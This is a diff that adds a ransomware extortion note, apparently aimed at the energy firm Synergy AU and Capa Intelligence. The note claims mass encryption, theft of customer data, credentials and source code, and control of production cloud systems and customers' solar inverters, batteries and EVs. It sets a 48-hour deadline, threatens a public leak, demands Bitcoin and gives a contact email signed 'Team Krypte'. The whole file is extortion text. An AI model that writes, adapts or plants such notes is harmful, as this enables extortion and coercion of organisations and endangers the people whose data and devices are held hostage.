@@ -1,0 +1,123 @@
+YOUR FILES ARE ENCRYPTED. YOUR DATA HAS BEEN EXFILTRATED.
+
+Before encryption we copied your files, databases, credentials, and internal
+records to servers we control. You have 48 hours to contact us and come to an agreement.
+
+WHAT HAPPENED
+
+  Every file was encrypted with X25519 + XChaCha20-Poly1305. Each file has a
+  unique cryptographic key derived through ECDH. Our master private key is the
+  only thing that can reconstruct that key. It does not exist inside the file,
+  on your system, or anywhere except our decryptor binary.
+
+  Git repositories: the .git history was archived into .git.enc. Working-tree
+  files were encrypted separately. Both require our decryptor to restore.
+
+  All enrolled solar inverters, batteries, and electric vehicles at customer
+  premises that are registered in Synergy's DER programs have been changed
+  to our remote server.
+
+  We are inside your production environment across all clusters and
+  subscriptions. We have full access to your Azure production estate, ArgoCD,
+  production AKS clusters, production Key Vaults, production Kafka,
+  production container registries, production databases, and production DNS.
+  Where backup infrastructure is obvious, we did not encrypt. We are still
+  inside those systems.
+
+  We have already exfiltrated everything: customer PII, smart meter and DER
+  telemetry, device registrations, operational secrets, internal architecture,
+  and production credentials for your core platforms. We also have all internal
+  source code for all of Synergy AU and Capa Intelligence, including private npm
+  packages and Docker images from your registries.
+
+  We control your production Kubernetes workloads, have redirected your
+  production servers to our infrastructure, and are steering live DER and smart
+  meter traffic at scale. Your production signing keys, encryption keys, API
+  credentials, and session secrets are in our possession. We can shut down your
+  smart meter network and DER programs, block recovery, and keep your field
+  device fleet under our control.
+
+HOW DECRYPTION WORKS
+
+  Our decryptor reads the footer of each encrypted file, reconstructs the key
+  via ECDH using our master key, verifies the authentication tag, and restores
+  the original file and filename. For .git.enc it unpacks the archive and
+  restores the full repository. No other tool can do either without our master key.
+
+  Our cryptor encrypted files without corrupting or wiping them.
+  Large files, databases, and archives were handled to completion, not left
+  half-destroyed the way other operators' tools have done. Our decryptor
+  restores every encrypted file to its original state.
+
+  Third-party decryptors have no access to our master key. They will fail
+  authentication and produce garbage output that permanently corrupts your files.
+  Do not use them. Do not rename or move encrypted files.
+
+  We will decrypt up to 3 files for free to prove our decryptor works. Choose
+  files that are not important to your operations.
+
+IF YOU DO NOT CONTACT US
+
+  The copy on our servers is complete and independent of what your team can
+  verify from affected systems alone, including material from remote shares and
+  other systems that may not have been encrypted.
+
+  After the deadline, everything we took goes to our leak site in full:
+  internal mail, contracts, payroll, customer lists, credentials, source code,
+  backups, and the rest. No redactions. No partial releases. The full archive
+  becomes public and searchable. This is irreversible.
+
+  Your partners, clients, regulators, and competitors will find it without
+  waiting for you to admit anything. Paying is the only way to stop the leak
+  and recover your files.
+
+NEGOTIATION
+
+  You may appoint a negotiator to contact us on your behalf, or you may contact
+  us directly if you prefer not to involve a third party. In either case, the
+  person who writes to us must be direct, authorized to agree terms, and ready
+  to pay. We accept Bitcoin only.
+
+  Open with your offer in the first message. Do not lead with a low price.
+
+  For the purposes of this negotiation, we treat a price as low when it fails
+  to account for the value of the data we hold, the reputational cost of a
+  full public release, and the regulatory and legal exposure your organization
+  would face once the archive is published.
+
+  Do not stall with questions we have already answered here, requests for
+  extensions, or attempts to buy time while your lawyers or insurers decide
+  what to do.
+
+  Anyone who wastes time will be treated as a refusal. That triggers the leak
+  and permanent loss of the decryption key for this build. There will be no
+  second chances.
+
+AFTER PAYMENT
+
+  Once payment is confirmed, we provide the decryptor and instructions to
+  restore your files. We delete every copy of your data from our servers,
+  staging systems, and backups. We remove your listing from our leak site if
+  it was posted, and we do not retain archives, indexes, or working copies
+  after the job is closed.
+
+  We will provide a script that runs through every remote we affected,
+  decrypting and restoring files on each system, including any production
+  servers or subscriptions that were hidden. The remote server your enrolled
+  devices were redirected to is restored and returned to your control.
+
+  We do not sell your data to brokers, publish it elsewhere, or return to the
+  same organization. Your company is marked in our records as paid and closed.
+  We do not encrypt you again, re-extort you on the same incident, or sell
+  access to your environment to other operators. That loyalty is part of the
+  agreement: you pay once, we deliver once, and we leave you alone.
+
+CONTACT
+
+  Email: teamkrypte@proton.me
+
+  Your ID: synergy
+
+SIGNED
+
+  Team Krypte
